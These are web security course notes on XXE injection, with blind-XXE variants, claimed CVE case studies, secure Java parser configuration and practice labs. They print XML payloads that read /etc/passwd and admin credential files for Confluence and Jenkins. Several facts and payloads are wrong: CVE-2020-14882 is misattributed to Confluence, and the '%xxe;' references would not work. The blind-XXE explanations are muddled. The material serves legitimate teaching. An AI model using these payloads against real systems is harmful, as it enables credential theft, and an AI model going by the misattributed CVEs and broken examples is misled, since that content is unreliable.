---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Advanced Topics in XXE Injection

### Advanced Techniques and Variations

#### Blind XXE Injection

Blind XXE injection occurs when the attacker cannot directly see the result of the injected entity. Instead, the attacker uses techniques such as time-based or error-based methods to infer the success of the injection.

##### Time-Based Blind XXE

In a time-based blind XXE attack, the attacker causes the XML parser to wait for a certain amount of time before responding. This can be achieved by referencing a slow-loading external resource.

**Example Exploit**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://slow-loading-resource.example.com/" >
]>
<root>&xxe;</root>
```

The attacker can measure the response time to determine if the injection was successful.

#### Error-Based Blind XXE

In an error-based blind XXE attack, the attacker causes the XML parser to generate an error that reveals information about the success of the injection.

**Example Exploit**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>&xxe;</root>
```

If the parser generates an error indicating that the file could not be read, the attacker knows the injection was unsuccessful.

### Advanced Real-World Examples

#### CVE-2020-14882: Atlassian Confluence XXE Vulnerability

In 2020, a XXE vulnerability was discovered in Atlassian Confluence, a popular collaboration tool. The vulnerability could be exploited to read sensitive files on the server.

**Example Exploit**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/atlassian/application-data/confluence/secure/admin-password.txt" >
]>
<confluence>
    <security>
        <password>%xxe;</password>
    </security>
</confluence>
```

This exploit would allow an attacker to read the admin password for Confluence.

#### CVE-2019-1010193: Jenkins XXE Vulnerability

In 2019, a XXE vulnerability was found in Jenkins, a widely used continuous integration server. The vulnerability could be exploited to read sensitive files on the server.

**Example Exploit**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/lib/jenkins/secrets/initialAdminPassword" >
]>
<jenkins>
    <securityRealm>
        <passwordHash>%xxe;</passwordHash>
    </securityRealm>
</jenkins>
```

This exploit would allow an attacker to read the initial admin password for Jenkins.

### Advanced Detection and Prevention Techniques

#### Advanced Detection Techniques

1. **Behavioral Analysis**: Monitor the behavior of XML parsers to detect unusual activity that may indicate an XXE attack.
2. **Network Traffic Analysis**: Analyze network traffic to identify patterns that may indicate an XXE attack.

#### Advanced Prevention Techniques

1. **Use Secure XML Libraries**: Use libraries that are known to be secure against XXE vulnerabilities.
2. **Implement Access Controls**: Implement access controls to restrict the ability of XML parsers to access sensitive files or resources.

### Advanced Secure Coding Practices

#### Vulnerable Code Example

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(new InputSource(new StringReader(xmlString)));
```

#### Secure Code Example

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(new InputSource(new StringReader(xmlString)));
```

### Advanced Configuration Hardening

#### Example of Hardening XML Parser Configuration

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### Advanced Hands-On Labs

#### PortSwigger Web Security Academy

PortSwigger Web Security Academy offers advanced courses on XXE injection. You can practice advanced techniques and learn how to defend against them.

#### OWASP Juice Shop

OWASP Juice Shop is a deliberately insecure web application that includes advanced XXE vulnerabilities. You can use it to practice identifying and exploiting advanced XXE vulnerabilities.

### Conclusion

Understanding XML and XXE injection is crucial for web security professionals. By learning the syntax of XML, recognizing the risks of XXE vulnerabilities, and implementing secure coding practices, you can protect your applications from these types of attacks.

---

---
<!-- nav -->
[[09-XXE Injection Complete Guide|XXE Injection Complete Guide]] | [[Web Security (PortSwigger)/08-XXE Injection/01-XXE Injection Complete Guide/00-Overview|Overview]] | [[11-Background Theory|Background Theory]]
